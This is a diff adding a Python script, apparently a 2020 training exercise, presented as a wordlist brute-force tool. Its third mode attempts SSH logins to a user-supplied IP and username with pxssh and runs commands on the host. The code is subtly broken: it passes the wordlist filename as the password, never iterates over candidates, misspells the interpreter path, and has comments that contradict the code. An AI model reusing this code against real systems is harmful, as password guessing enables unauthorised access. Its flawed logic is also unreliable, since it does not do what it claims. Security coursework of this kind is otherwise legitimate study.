@@ -1,1 +1,146 @@
+#!/user/bin/env python3
+#-----------------------------------------------------------------------#
+# Script Name                Ops Challenge 16
+# Author                     Kimberley Cabrera-Boggs
+# Date of last revision      October 26, 2020
+# Description of purpose     Automated Brute Force Wordlist Attack Tool
+#-----------------------------------------------------------------------#
+print("""
+                                                 /===-_---~~~~~~~~~------____
+                                                |===-~___                _,-'
+                 -==\\\                         `//~\\\\   ~~~~`---.___.-~~
+             ______-==|                         | |  \\\\           _-~`
+       __--~~~  ,-/-==\\\\                        | |   `\\        ,'
+    _-~       /'    |  \\\\                      / /      \\      /
+  .'        /       |   \\\\                   /' /        \\   /'
+ /  ____  /         |    \\`\\.__/-~~ ~ \\ _ _/'  /          \\/'
+/-'~    ~~~~~---__  |     ~-/~         ( )   /'        _--~`
+                  \\_|      /        _)   ;  ),   __--~~
+                    '~~--_/      _-~/-  / \\   '-~ \\
+                   {\\__--_/}    / \\\\_>- )<__\\      \\
+                   /'   (_/  _-~  | |__>--<__|      |
+                  |0  0 _/) )-~     | |__>--<__|     |
+                  / /~ ,_/       / /__>---<__/      |
+                 o o _//        /-~_>---<__-~      /
+                 (^(~          /~_>---<__-      _-~
+                ,/|           /__>--<__/     _-~
+             ,//('(          |__>--<__|     /                  .----_
+            ( ( '))          |__>--<__|    |                 /' _---_~\\
+         `-)) )) (           |__>--<__|    |               /'  /     ~\\`\\
+        ,/,'//( (             \\__>--<__\\    \\            /'  //        ||
+      ,( ( ((, ))              ~-__>--<_~-_  ~--____---~' _/'/        /'
+    `~/  )` ) ,/|                 ~-_~>--<_/-__       __-~ _/
+  ._-~//( )/ )) `                    ~~-'_/_/ /~~~~~~~__--~
+   ;'( ')/ ,)(                              ~~~~~~~~~~
+  ' ') '( (/
+    '   '  `
 
+
+
+██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████     
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██          
+██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████       
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██          
+██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████     
+                                                                                                                                                                                    
+
+""")                                                   
+#--------------------------Import Libraries---------------------#
+import os
+import time
+import getpass
+import itertools
+from pexpect import pxssh 
+#--------------------------Function-----------------------------#
+def user_selection():
+    user_choice=input("""
+    select a mode:
+    1. Mode 1
+    2. Mode 2
+    3. Mode 3
+    4. Exit
+    """)
+# if conditional statment
+    if(user_choice =="1"):
+      mode1()
+    elif(user_choice =="2"):
+      mode2()
+    elif(user_choice =="3"):
+      mode3()
+    else:
+      print("Exit")
+      exit()
+
+#-----------Mode 1-----------#
+def mode1():
+
+# Accept a user input word list file path and iterates through the word list assigning the word being read to a variable
+  word_list = input("Enter a Filename: ")
+
+  filename=open(word_list, "r", encoding= "ISO-8859-1")
+  fileline=filename.readlines()
+
+  for line in fileline:
+    print(line)
+# Adding a delay between words sleep for 2 seconds
+    time.sleep(1) 
+
+# The value of the variables will print to the screen
+
+#----------Mode 2------------# 
+def mode2():
+
+# Accepts a user input string
+    user_string=input("Enter a String: ")
+# Accepts a user input word list file path
+    word_list = input("Enter a Filename: ")
+# Search the word list for the user input string
+    filename=open(word_list, "r", encoding= "ISO-8859-1")
+    fileline=filename.read().splitlines()
+
+    for line in fileline:
+# if conditional statement
+      if str(line) == user_string:
+        print("Gotcha!!!")
+        break
+      else:
+        print("not this one!!!")
+    input()
+# Print to the screen whether the string appeared in the word list
+
+#----------Mode 3------------# 
+def mode3():
+
+    s = pxssh.pxssh()
+    host=input("Enter IP address: ")
+    username=input("Enter Username: ")
+    # password=input("Enter a password: ")
+
+    word_list = input("Enter a Filename: ")
+
+    filename=open(word_list, "r", encoding= "ISO-8859-1")
+    fileline=filename.readlines()
+
+    for line in fileline:
+      print(line)
+
+    try:
+        s.login(host, username, word_list)
+        s.sendline("uptime")
+        s.prompt()
+# print everything before the prompt
+        print(s.before)       
+        s.sendline("ls -l")
+        s.prompt()
+        print(s.before)
+        s.sendline("df")
+        s.prompt()
+        print(s.before)
+        s.logout()
+    except pxssh.ExceptionPxssh as e:
+        print("pxssh failed on login.")
+        print(e)
+
+#----------------------------Main-------------------------------#
+user_selection()
+#----------------------------End--------------------------------#
